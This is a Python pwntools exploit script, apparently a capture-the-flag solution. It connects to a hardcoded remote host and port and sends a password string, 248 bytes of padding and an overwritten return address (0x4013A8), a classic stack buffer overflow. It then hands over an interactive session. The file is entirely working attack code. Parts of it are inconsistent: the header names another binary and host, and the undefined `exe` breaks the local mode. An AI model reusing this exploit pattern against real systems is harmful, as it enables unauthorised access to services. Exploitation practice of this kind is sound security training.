#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ./hello-goodbye.elf --host 109.233.56.90 --port 11670
from pwn import *
from struct import pack

# Set up pwntools for the correct architecture
#exe = context.binary = ELF('./pwnrace')



host = args.HOST or '159.223.101.241'
port = int(args.PORT or 31337)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.EDB:
        return process(['edb','--run', exe.path] + argv, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    elif args.EDB:
        return process(['edb','--run', exe.path] + argv, *a, **kw)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())



io = start()

io.recvline()
io.sendline(b'hAcK_Th3_Pl@n3t\x00'+b'a'*248+p64(0x4013A8))
io.interactive()
